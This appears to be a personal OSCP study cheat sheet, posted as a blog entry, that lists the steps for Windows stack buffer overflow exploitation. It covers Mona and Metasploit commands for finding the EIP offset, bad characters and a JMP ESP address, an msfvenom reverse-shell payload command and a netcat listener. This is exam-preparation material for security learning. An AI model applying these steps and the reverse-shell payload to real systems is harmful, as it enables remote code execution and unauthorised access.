---
layout: post
title: Buffer Overflow personnal cheatsheet
tags: [OSCP, Buffer Overflow, cheatsheet]
description: "Buffer Overflow personnal cheatsheet"

---

### Check for windows protections :

- C:\Users\thiba\Desktop\build\Release\winchecksec.exe PATH.exe

# Buffer Overflow "Normal" :

### Mona Configuration :

- mona config -set workingfolder c:\mona\%p

### Fuzzing :

- fuzzer.py / fuzzer2.py -> until app crash
- /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l SIZE -> SIZE higher than crash offset

### Crash Replication & Controlling EIP :

- modify payload variable by pattern (exploit.py) 
- !mona findmsp -distance SIZE -> SIZE same as pattern
- EIP contains normal pattern : ... (offset XXXX) -> get the offset, modify offset variable (exploit.py)
- modify retn variable by "BBBB", remove payload
- Re-run exploit.py -> EIP should be "BBBB"

### Finding Bad Characters :

- !mona bytearray -b "\x00" -> copy results to payload variable
- Re-run exploit.py
- !mona compare -f C:\mona\oscp\bytearray.bin -a ESP_ADDRESS -> copy bad chars
- !mona bytearray -b "\x00 + BAD_CHARS" -> copy results to payload variable
- !mona compare -f C:\mona\oscp\bytearray.bin -a ESP_ADDRESS -> Repeat the badchar comparison until the results status returns
- "Unmodified". This indicates that no more badchars exist.

### Finding a Jump Point :

- !mona jmp -r esp -cpb "BAD_CHARS" -> Choose an address and update exploit.py, setting the "retn" variable to the address, written backwards

### Generate Payload :

- msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "BAD_CHARS" -f py -> Copy the generated shell code setting the payload variable

### Prepend NOPs :

- padding = "\x90" * 16

### Start nc listerner :

- nc -lvp 1234

